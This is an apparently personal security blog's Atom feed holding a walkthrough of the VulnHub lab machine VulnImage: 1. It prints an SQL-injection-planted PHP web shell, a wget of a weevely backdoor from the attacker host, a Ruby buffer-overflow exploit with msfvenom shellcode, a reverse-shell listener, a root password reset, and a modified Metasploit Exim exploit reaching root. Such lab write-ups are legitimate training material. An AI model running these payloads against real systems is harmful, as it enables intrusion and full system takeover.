<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Vulnimage | 0x73696e65]]></title>
  <link href="http://73696e65.github.io/blog/categories/vulnimage/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-12-15T09:19:39+01:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[VulnImage: 1]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/10/vulnimage-1/"/>
    <updated>2015-05-10T15:18:05+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/10/vulnimage-1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/vulnimage-1,39/">VulnImage: 1</a></p>

<p>Nmap output:
{% codeblock %}
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 5.1p1 Debian 5 (protocol 2.0)
25/tcp   open  smtp        Exim smtpd 4.50
80/tcp   open  http        Apache httpd 2.2.9 ((Debian) PHP/5.2.6-1+lenny9 with Suhosin-Patch)
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-24+lenny4
7777/tcp open  cbt?
{% endcodeblock %}</p>

<p>With dirb we found a few interesting directories (repo, admin, profiles),
directory listing is enabled:
{% codeblock %}
&mdash;- Scanning URL: <a href="http://192.168.80.143/">http://192.168.80.143/</a> &mdash;-
+ <a href="http://192.168.80.143/index">http://192.168.80.143/index</a> (CODE:200|SIZE:71)  <br/>
+ <a href="http://192.168.80.143/view">http://192.168.80.143/view</a> (CODE:200|SIZE:166)  <br/>
==> DIRECTORY: <a href="http://192.168.80.143/admin/">http://192.168.80.143/admin/</a>  <br/>
==> DIRECTORY: <a href="http://192.168.80.143/profiles/">http://192.168.80.143/profiles/</a>  <br/>
==> DIRECTORY: <a href="http://192.168.80.143/repo/">http://192.168.80.143/repo/</a>  <br/>
+ <a href="http://192.168.80.143/myblog">http://192.168.80.143/myblog</a> (CODE:200|SIZE:736)  <br/>
+ <a href="http://192.168.80.143/server-status">http://192.168.80.143/server-status</a> (CODE:403|SIZE:332)  <br/>
{% endcodeblock %}</p>

<p>Submitting the quote gives an error SQL message:
{% codeblock %}
<a href="http://192.168.80.143/admin/profile.php">http://192.168.80.143/admin/profile.php</a>
Username: &lsquo;
Password a</p>

<p>&hellip;
SELECT * FROM blog_users WHERE poster = &lsquo;&rsquo;&lsquo; AND password = &#8216;a&rsquo;
{% endcodeblock %}</p>

<p>After a few minutes of playing with requests we realize that we can create
files in format &lsquo;username-fname&rsquo; and with the content of &lsquo;sig&rsquo; parameter.
{% codeblock %}
POST /admin/profile.php HTTP/1.1
Host: 192.168.80.143
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: <a href="http://192.168.80.143/admin/profile.php">http://192.168.80.143/admin/profile.php</a>
Connection: keep-alive
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 104</p>

<p>username=testa&amp;password=test&#8217; or &lsquo;2&rsquo;=&lsquo;2&amp;sig=&lt;?php system($_REQUEST[&#8216;cmd&rsquo;]); ?>&amp;fname=x.php&amp;submit=Submit
{% endcodeblock %}</p>

<p>Now we have a simple PHP shell:
{% codeblock %}
<a href="http://192.168.80.143/profiles/testa-x.php?cmd=id">http://192.168.80.143/profiles/testa-x.php?cmd=id</a></p>

<p>uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endcodeblock %}</p>

<p>We download the weevely.php from our server and connect:
{% codeblock %}
<a href="http://192.168.80.143/profiles/testa-x.php?cmd=wget">http://192.168.80.143/profiles/testa-x.php?cmd=wget</a> 192.168.80.137/weevely.php.txt -O c.php
root@kali32:~# weevely <a href="http://192.168.80.143/profiles/c.php">http://192.168.80.143/profiles/c.php</a> 1234
{% endcodeblock %}</p>

<p>In the repo directory, we examine the buffd.c. It is a vulnerable daemon,
listening on port 7777.
{% codeblock lang:c %}
debian:/tmp# cat /var/www/repo/buffd.c</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;errno.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;sys/socket.h></h1>

<h1>include &lt;netinet/in.h></h1>

<h1>include &lt;netdb.h></h1>

<h1>include &lt;arpa/inet.h></h1>

<h1>include &lt;sys/wait.h></h1>

<h1>include &lt;signal.h></h1>

<h1>define PORT &ldquo;7777&rdquo; // the port users will be connecting to</h1>

<h1>define BACKLOG 10       // how many pending connections queue will hold</h1>

<p>void vulnerable(char *net_buffer)
{
char local_buffer[120];
strcpy(local_buffer, net_buffer);
return;
}</p>

<p>void sigchld_handler(int s)
{
while(waitpid(-1, NULL, WNOHANG) > 0);
}</p>

<p>// get sockaddr, IPv4 or IPv6:
void <em>get_in_addr(struct sockaddr </em>sa)
{
if (sa->sa_family == AF_INET) {
return &amp;(((struct sockaddr_in*)sa)->sin_addr);
}</p>

<p>return &amp;(((struct sockaddr_in6*)sa)->sin6_addr);
}</p>

<p>int main(void)
{
int sockfd, new_fd; // listen on sock_fd, new connection on new_fd
struct addrinfo hints, <em>servinfo, </em>p;
struct sockaddr_storage their_addr; // connector&rsquo;s address information
socklen_t sin_size;
struct sigaction sa;
int yes=1;
char in_buffer[20], out_buffer[20], net_buffer[2048];
char s[INET6_ADDRSTRLEN];
int rv;</p>

<p>memset(&amp;hints, 0, sizeof hints);
hints.ai_family = AF_UNSPEC;
hints.ai_socktype = SOCK_STREAM;
hints.ai_flags = AI_PASSIVE; // use my IP</p>

<p>if ((rv = getaddrinfo(NULL, PORT, &amp;hints, &amp;servinfo)) != 0) {
fprintf(stderr, &ldquo;getaddrinfo: %s\n&rdquo;, gai_strerror(rv));
return 1;
}</p>

<p>// loop through all the results and bind to the first we can
for(p = servinfo; p != NULL; p = p->ai_next) {
if ((sockfd = socket(p->ai_family, p->ai_socktype,
p->ai_protocol)) == -1) {
perror(&ldquo;server: socket&rdquo;);
continue;
}</p>

<p>if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;yes,
sizeof(int)) == -1) {
perror(&ldquo;setsockopt&rdquo;);
exit(1);
}</p>

<p>if (bind(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
close(sockfd);
perror(&ldquo;server: bind&rdquo;);
continue;
}</p>

<p>break;
}</p>

<p>if (p == NULL) {
fprintf(stderr, &ldquo;server: failed to bind\n&rdquo;);
return 2;
}</p>

<p>freeaddrinfo(servinfo); // all done with this structure</p>

<p>if (listen(sockfd, BACKLOG) == -1) {
perror(&ldquo;listen&rdquo;);
exit(1);
}</p>

<p>sa.sa_handler = sigchld_handler; // reap all dead processes
sigemptyset(&amp;sa.sa_mask);
sa.sa_flags = SA_RESTART;
if (sigaction(SIGCHLD, &amp;sa, NULL) == -1) {
perror(&ldquo;sigaction&rdquo;);
exit(1);
}</p>

<p>printf(&ldquo;server: waiting for connections&hellip;\n&rdquo;);</p>

<p>while(1) { // main accept() loop
sin_size = sizeof their_addr;
new_fd = accept(sockfd, (struct sockaddr *)&amp;their_addr, &amp;sin_size);
if (new_fd == -1) {
perror(&ldquo;accept&rdquo;);
continue;
}</p>

<p>inet_ntop(their_addr.ss_family,
get_in_addr((struct sockaddr *)&amp;their_addr),
s, sizeof s);
printf(&ldquo;server: got connection from %s\n&rdquo;, s);</p>

<p>if (!fork()) { // this is the child process
close(sockfd); // child doesn&rsquo;t need the listener
memset(net_buffer, 0, 1024);
strcpy(out_buffer, &ldquo;HELO\nCOMMAND:&rdquo;);
if (send(new_fd, out_buffer, strlen(out_buffer), 0) == -1)
perror(&ldquo;send&rdquo;);
if (recv(new_fd, net_buffer, 1024, 0))
{
vulnerable(net_buffer);
strcpy(out_buffer, &ldquo;RECV: &rdquo;);
strcat(out_buffer, net_buffer);
send(new_fd, out_buffer, strlen(out_buffer), 0);
}
close(new_fd);
exit(0);
}
close(new_fd); // parent doesn&rsquo;t need this
}</p>

<p>return 0;
}
{% endcodeblock %}</p>

<p>We copy buffd binary from server (/usr/local/sbin/buffd) and using metasploit
patterns we calculate the offset for EIP. To make an exploit reliable, we are
looking also for some registers, pointing to our pattern in memory.
{% codeblock %}
root@kali32:~/repo# gdb ./buffd  -q
Reading symbols from /root/repo/buffd&hellip;done.
(gdb) set follow-fork-mode child
(gdb) run
Starting program: /root/repo/buffd
warning: no loadable sections found in added symbol-file system-supplied DSO at 0xb7fe0000
server: waiting for connections&hellip;
server: got connection from 127.0.0.1
[New process 4201]</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[Switching to process 4201]
0x65413165 in ?? ()
(gdb) i r
eax            0xbfffe790       -1073748080
ecx            0x0      0
edx            0xca     202
ebx            0xb7fbeff4       -1208225804
esp            0xbfffe810       0xbfffe810
ebp            0x41306541       0x41306541
esi            0x0      0
edi            0x0      0
eip            0x65413165       0x65413165
eflags         0x10246  [ PF ZF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x /5x $eax
0xbfffe790:     0x41306141      0x61413161      0x33614132      0x41346141
0xbfffe7a0:     0x61413561</p>

<p>root@kali32:~# nc 127.0.0.1 7777
HELO
COMMAND:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
^C
root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x65413165
[<em>] Exact match at offset 124
root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41306141
[</em>] Exact match at offset 0
{% endcodeblock %}</p>

<p>EIP begins on offset 124 and the register EAX points to the beginning of our
buffer, right now filled with pattern. Luckily, we find call eax opcodes in
binary too.</p>

<p>The strange thing is that the stack in binary is marked as non-executable,
but on this server the exploit works and we don&rsquo;t get segfault:</p>

<p>{% codeblock %}
www-data@:/home/testuser $ readelf -lW /usr/local/sbin/buffd
Elf file type is EXEC (Executable file)
Entry point 0x80488e0
There are 7 program headers, starting at offset 52</p>

<p>Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
  INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x01004 0x01004 R E 0x1000
  LOAD           0x001004 0x0804a004 0x0804a004 0x00170 0x0017c RW  0x1000
  DYNAMIC        0x001018 0x0804a018 0x0804a018 0x000d0 0x000d0 RW  0x4
  NOTE           0x000128 0x08048128 0x08048128 0x00020 0x00020 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
{% endcodeblock %}</p>

<p>Exploit in Ruby:
{% codeblock lang:ruby %}
root@kali32:~# cat exploit.rb</p>

<h1>!/usr/bin/env ruby</h1>

<p>require &lsquo;socket&rsquo;</p>

<h1>root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j ebp,ebx,esp,eax repo/buffd</h1>

<h1>[repo/buffd]</h1>

<h1>0x0804898f call eax</h1>

<h1>0x08048efb call eax</h1>

<h1>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/exec -b &lsquo;\x00\xff&rsquo; CMD=&ldquo;/tmp/commands&rdquo; -f ruby</h1>

<p>buf =
&ldquo;\xdd\xc2\xd9\x74\x24\xf4\xbd\x38\x6f\xc2\x8c\x58\x33\xc9&rdquo; +
&ldquo;\xb1\x0d\x31\x68\x18\x03\x68\x18\x83\xc0\x3c\x8d\x37\xe6&rdquo; +
&ldquo;\x37\x09\x21\xa5\x21\xc1\x7c\x29\x24\xf6\x17\x82\x45\x91&rdquo; +
&ldquo;\xe7\xb4\x86\x03\x81\x2a\x51\x20\x03\x5b\x6f\xa7\xa4\x9b&rdquo; +
&ldquo;\x40\xd3\xc9\xeb\xb1\x78\x7d\x61\xa0\x1f\xef\x1d\x49\xe0&rdquo; +
&ldquo;\xb8\x8e\x24\x01\x8b\xb1&rdquo;</p>

<p>exploit = buf + &ldquo;A&rdquo; * (124 - buf.length)
exploit &lt;&lt; [0x0804898f].pack(&ldquo;V&rdquo;)</p>

<p>host = ARGV[0]
host ||= &ldquo;192.168.80.143&rdquo;</p>

<p>puts &ldquo;Using host: #{host}&rdquo;</p>

<p>s = TCPSocket.new host, 7777
s.puts(exploit)
s.close
{% endcodeblock %}</p>

<p>Exploit runs arbitrary command that we put on vulnerable server to /tmp/commands.</p>

<p>We connect to the host:
{% codeblock %}
www-data@:/home/testuser $ :backdoor.reversetcp -port 1337 192.168.80.137 -no-connect</p>

<p>root@kali32:~# nc -lvp 1337
listening on [any] 1337 &hellip;
192.168.80.143: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.80.137] from (UNKNOWN) [192.168.80.143] 32787
sh: no job control in this shell
sh-2.05b$ cd /tmp
{% endcodeblock %}</p>

<p>To obtain root privileges, we can run ssh server and put to &lsquo;/tmp/commands&rsquo;
file the instructions to change root password:
{% codeblock %}
debian:/tmp# chmod +x commands
debian:/tmp# cat commands
echo -e &ldquo;1234\n1234\n&rdquo; | passwd
{% endcodeblock %}</p>

<p>Kernel is vulnerable too, using this exploit we can get uid 0 privileges:
{% codeblock %}
sh-2.05b$ wget -O socksend.c <a href="http://www.exploit-db.com/download/9479">http://www.exploit-db.com/download/9479</a>
{% endcodeblock %}</p>

<p>In Metasploit is there is another module which we can use to exploit Exim4
(exploit/unix/smtp/exim4_string_format). To make it work correctly, we need
to comment the following lines and also change exim to exim4:
{% codeblock lang:ruby %}
114     #if not datastore[&lsquo;SkipVersionCheck&rsquo;] and self.banner !~ /Exim 4.6\d+/i
115     #  fail_with(Failure::Unknown, &ldquo;Warning: This version of Exim is not exploitable&rdquo;)
116     #end
&hellip;
341       sock.put(&ldquo;PATH=/bin:/sbin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin exim4 -C#{temp_conf} -q\n&rdquo;)
{% endcodeblock %}</p>

<p>{% codeblock %}
msf exploit(exim4_string_format) > rexploit
[*] Reloading module&hellip;</p>

<p>[<em>] Started reverse double handler
[</em>] Connecting to 192.168.80.143:25 &hellip;
[<em>] Server: 220 localhost.localdomain ESMTP Exim 4.50 Sat, 09 May 2015 07:53:30 +0200
[</em>] EHLO: 250-localhost.localdomain Hello cpR0uwxe.com [192.168.80.137]
[<em>] EHLO: 250-SIZE 52428800
[</em>] EHLO: 250-PIPELINING
[<em>] EHLO: 250 HELP
[</em>] Determined our hostname is cpR0uwxe.com and IP address is 192.168.80.137
[<em>] MAIL: 250 OK
[</em>] RCPT: 250 Accepted
[<em>] DATA: 354 Enter message, ending with &ldquo;.&rdquo; on a line by itself
[</em>] Constructing initial headers &hellip;
[<em>] Constructing HeaderX &hellip;
[</em>] Constructing body &hellip;
[<em>] Sending 50 megabytes of data&hellip;
[</em>] Ending first message.
[<em>] Result: &ldquo;552 Message size exceeds maximum permitted\r\n&rdquo;
[</em>] Sending second message &hellip;
[<em>] MAIL result: &ldquo;250 OK\r\n&rdquo;
[</em>] RCPT result: &ldquo;sh-2.05b$ &rdquo;
[<em>] Looking for Perl to facilitate escalation&hellip;
[</em>] Perl binary detected, attempt to escalate&hellip;
[<em>] Using Perl interpreter at /usr/bin/perl&hellip;
[</em>] Creating temporary files /var/tmp/oYEMVjYJ and /var/tmp/LCpxpIyv&hellip;
[<em>] Attempting to execute payload as root&hellip;
[</em>] Accepted the first client connection&hellip;
[<em>] Accepted the second client connection&hellip;
[</em>] Command: echo QDibz6UzrEBUyJQT;
[<em>] Writing to socket A
[</em>] Writing to socket B
[<em>] Reading from sockets&hellip;
[</em>] Reading from socket B
[<em>] B: &ldquo;QDibz6UzrEBUyJQT\r\n&rdquo;
[</em>] Matching&hellip;
[<em>] A is input&hellip;
[</em>] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.143:32803) at 2015-05-06 07:40:24 +0200</p>

<p>id
uid=0(root) gid=0(root)
{% endcodeblock %}</p>
]]></content>
  </entry>
  
</feed>
